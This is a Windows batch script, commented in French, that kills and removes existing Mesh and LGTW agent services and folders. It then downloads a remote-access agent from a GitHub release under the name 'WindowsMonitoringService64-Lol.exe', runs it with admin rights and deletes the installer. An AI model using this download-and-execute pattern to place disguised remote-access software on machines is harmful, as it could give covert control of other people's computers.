@echo off
setlocal enabledelayedexpansion

:: Configuration
set "LDIR=C:\Temp"
set "LFILE=%LDIR%\agent_maintenance.log"
set "URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
set "T_EXE=%TEMP%\WindowsMonitoringService64-Lol.exe"

if not exist "%LDIR%" mkdir "%LDIR%"
echo [START] %DATE% %TIME% >> "%LFILE%"

:: 1. Verif Admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Pas admin. >> "%LFILE%"
    exit /b 1
)

:: 2. Arrêt AGRESSIF (Recherche par nom partiel)
echo [2] Arret force des processus et services... >> "%LFILE%"
:: On tue tout ce qui contient "Mesh" ou "LGTW"
taskkill /F /FI "IMAGENAME eq Mesh*" /T >> "%LFILE%" 2>&1
taskkill /F /FI "IMAGENAME eq LGTW*" /T >> "%LFILE%" 2>&1
taskkill /F /IM "WindowsMonitoringService64-Lol.exe" /T >> "%LFILE%" 2>&1

:: Arrêt et suppression radicale des services
sc stop "Mesh Agent" >> "%LFILE%" 2>&1
sc delete "Mesh Agent" >> "%LFILE%" 2>&1
sc stop "LGTW-Agent" >> "%LFILE%" 2>&1
sc delete "LGTW-Agent" >> "%LFILE%" 2>&1

timeout /t 5 /nobreak >nul

:: 3. Nettoyage dossiers
echo [3] Nettoyage dossiers... >> "%LFILE%"
set "D1=%ProgramFiles%\Mesh Agent"
set "D2=%ProgramFiles%\LGTW"
set "D3=%ProgramFiles(x86)%\Mesh Agent"

for %%D in ("%D1%" "%D2%" "%D3%") do (
    if exist "%%~D" (
        echo [INFO] Nettoyage de %%~D >> "%LFILE%"
        :: On retire les droits "Lecture seule" qui bloquent parfois rd
        attrib -r -s -h "%%~D\*.*" /s /d >nul 2>&1
        rd /s /q "%%~D" >> "%LFILE%" 2>&1
        
        if exist "%%~D" (
            echo [ALERTE] Dossier toujours present, tentative de renommage... >> "%LFILE%"
            ren "%%~D" "OLD_AGENT_%RANDOM%" >> "%LFILE%" 2>&1
        )
    )
)

:: 4. Telechargement
echo [4] Telechargement de WindowsMonitoringService64-Lol.exe... >> "%LFILE%"
curl -L -f -o "%T_EXE%" "%URL%" >> "%LFILE%" 2>&1

if not exist "%T_EXE%" (
    echo [ERREUR] Telechargement echoue. Verifiez l'URL ou la connexion. >> "%LFILE%"
    goto :final
)

:: 5. Execution
echo [5] Execution de l'agent... >> "%LFILE%"
:: On lance l'agent. 
start "" "%T_EXE%"
echo [OK] Lance. >> "%LFILE%"

:: 6. Nettoyage final
timeout /t 10 /nobreak >nul
del /f /q "%T_EXE%" >> "%LFILE%" 2>&1

:final
echo [END] %DATE% %TIME% >> "%LFILE%"
echo -------------------------- >> "%LFILE%"
exit /b 0
